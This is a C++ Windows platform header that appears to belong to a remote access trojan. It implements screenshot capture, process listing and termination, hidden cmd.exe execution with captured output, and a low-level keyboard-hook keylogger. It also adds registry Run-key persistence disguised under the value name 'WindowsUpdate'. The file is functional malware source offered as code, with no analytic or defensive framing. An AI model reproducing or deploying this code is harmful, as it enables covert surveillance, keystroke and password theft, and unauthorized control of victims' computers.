#ifndef PLATFORM_WINDOWS_H
#define PLATFORM_WINDOWS_H

#ifdef _WIN32

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <userenv.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <memory>

namespace Platform
{
    // Socket API compatibility layer
    inline void initializeNetworking()
    {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }

    inline void cleanupNetworking()
    {
        WSACleanup();
    }

    inline int getLastSocketError()
    {
        return WSAGetLastError();
    }

    inline void closeSocket(int socketfd)
    {
        closesocket(socketfd);
    }

    // System information
    inline std::string getHostname()
    {
        char hostname[256];
        DWORD size = sizeof(hostname);
        if (GetComputerNameA(hostname, &size))
        {
            return std::string(hostname);
        }
        return "Unknown";
    }

    inline std::string getUsername()
    {
        char username[256];
        DWORD size = sizeof(username);
        if (GetUserNameA(username, &size))
        {
            return std::string(username);
        }
        return "Unknown";
    }

    inline std::string getOSInfo()
    {
        OSVERSIONINFOA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

#pragma warning(disable : 4996)
        GetVersionExA(&osvi);
#pragma warning(default : 4996)

        return "Windows " + std::to_string(osvi.dwMajorVersion) + "." +
               std::to_string(osvi.dwMinorVersion) + " (Build " +
               std::to_string(osvi.dwBuildNumber) + ")";
    }

    // File operations
    inline std::string getCurrentDirectory()
    {
        char path[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, path);
        return std::string(path);
    }

    inline std::vector<std::pair<std::string, bool>> listDirectory(const std::string &path)
    {
        std::vector<std::pair<std::string, bool>> result;
        WIN32_FIND_DATAA findData;
        std::string searchPath = path + "\\*";

        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                std::string filename = findData.cFileName;
                if (filename != "." && filename != "..")
                {
                    bool isDirectory = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
                    result.push_back(std::make_pair(filename, isDirectory));
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
        return result;
    }

    // Screenshot functionality
    inline std::vector<uint8_t> captureScreenshot()
    {
        std::vector<uint8_t> imageData;

        // Initialize GDI+
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        // Get screen dimensions
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);

        // Create compatible DC and bitmap
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMemory = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmap);

        // Copy screen to bitmap
        BitBlt(hdcMemory, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

        // Convert bitmap to PNG data using GDI+
        Gdiplus::Bitmap bitmap(hBitmap, NULL);

        IStream *pStream = NULL;
        if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)
        {
            CLSID pngClsid;
            GetEncoderClsid(L"image/png", &pngClsid);
            if (bitmap.Save(pStream, &pngClsid) == Gdiplus::Ok)
            {
                // Get stream size
                STATSTG stat;
                pStream->Stat(&stat, STATFLAG_NONAME);

                // Convert stream to vector
                LARGE_INTEGER pos = {0};
                pStream->Seek(pos, STREAM_SEEK_SET, NULL);

                imageData.resize(stat.cbSize.QuadPart);
                ULONG bytesRead;
                pStream->Read(imageData.data(), stat.cbSize.QuadPart, &bytesRead);
            }
            pStream->Release();
        }

        // Cleanup
        SelectObject(hdcMemory, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMemory);
        ReleaseDC(NULL, hdcScreen);

        Gdiplus::GdiplusShutdown(gdiplusToken);

        return imageData;
    }

    // Helper function for screenshot functionality
    inline int GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
    {
        UINT num = 0;  // number of image encoders
        UINT size = 0; // size of the image encoder array in bytes

        Gdiplus::ImageCodecInfo *pImageCodecInfo = NULL;

        Gdiplus::GetImageEncodersSize(&num, &size);
        if (size == 0)
            return -1;

        pImageCodecInfo = (Gdiplus::ImageCodecInfo *)(malloc(size));
        if (pImageCodecInfo == NULL)
            return -1;

        Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

        for (UINT j = 0; j < num; ++j)
        {
            if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
            {
                *pClsid = pImageCodecInfo[j].Clsid;
                free(pImageCodecInfo);
                return j;
            }
        }

        free(pImageCodecInfo);
        return -1;
    }

    // Process management
    inline std::vector<std::pair<DWORD, std::string>> getProcessList()
    {
        std::vector<std::pair<DWORD, std::string>> processes;

        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE)
        {
            return processes;
        }

        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(snapshot, &entry))
        {
            do
            {
                processes.push_back(std::make_pair(entry.th32ProcessID, std::string(entry.szExeFile)));
            } while (Process32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);
        return processes;
    }

    inline bool killProcess(DWORD pid)
    {
        HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (process == NULL)
        {
            return false;
        }

        bool result = TerminateProcess(process, 0);
        CloseHandle(process);
        return result;
    }

    // Persistence
    inline bool installPersistence(const std::string &executablePath)
    {
        // Add to registry for autorun
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        {
            return false;
        }

        bool result = (RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                                      (const BYTE *)executablePath.c_str(),
                                      executablePath.length() + 1) == ERROR_SUCCESS);
        RegCloseKey(hKey);

        return result;
    }

    inline bool removePersistence()
    {
        // Remove from registry
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        {
            return false;
        }

        bool result = (RegDeleteValueA(hKey, "WindowsUpdate") == ERROR_SUCCESS);
        RegCloseKey(hKey);

        return result;
    }

    // Shell execution
    inline std::string executeCommand(const std::string &command)
    {
        std::string result;
        HANDLE hPipeRead, hPipeWrite;

        SECURITY_ATTRIBUTES sa = {0};
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;

        if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0))
        {
            return "Error creating pipe";
        }

        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};

        si.cb = sizeof(STARTUPINFO);
        si.hStdError = hPipeWrite;
        si.hStdOutput = hPipeWrite;
        si.dwFlags = STARTF_USESTDHANDLES;

        // Create cmd.exe process
        std::string cmdLine = "cmd.exe /c " + command;
        if (!CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, TRUE,
                            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            CloseHandle(hPipeRead);
            CloseHandle(hPipeWrite);
            return "Error creating process";
        }

        // Close the write end of the pipe in this process
        CloseHandle(hPipeWrite);

        // Read the output
        char buffer[4096];
        DWORD bytesRead;

        while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
        {
            buffer[bytesRead] = '\0';
            result += buffer;
        }

        // Clean up
        CloseHandle(hPipeRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return result;
    }

    // Keylogger functionality
    class Keylogger
    {
    private:
        static HHOOK keyboardHook;
        static std::string logBuffer;
        static bool isRunning;

    public:
        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
        {
            if (nCode >= 0 && wParam == WM_KEYDOWN)
            {
                KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
                DWORD vkCode = kbStruct->vkCode;

                char keyName[16];
                GetKeyNameTextA(kbStruct->scanCode << 16, keyName, sizeof(keyName));

                if (strlen(keyName) > 1)
                {
                    logBuffer += "[" + std::string(keyName) + "]";
                }
                else
                {
                    logBuffer += keyName;
                }
            }

            return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
        }

        static bool start()
        {
            if (isRunning)
                return true;

            keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
            if (keyboardHook == NULL)
                return false;

            isRunning = true;
            logBuffer.clear();
            return true;
        }

        static bool stop()
        {
            if (!isRunning)
                return true;

            bool result = UnhookWindowsHookEx(keyboardHook);
            isRunning = false;
            return result;
        }

        static std::string dump()
        {
            std::string result = logBuffer;
            logBuffer.clear();
            return result;
        }
    };

    // Static member initialization
    HHOOK Keylogger::keyboardHook = NULL;
    std::string Keylogger::logBuffer = "";
    bool Keylogger::isRunning = false;
};

#endif // _WIN32
#endif // PLATFORM_WINDOWS_H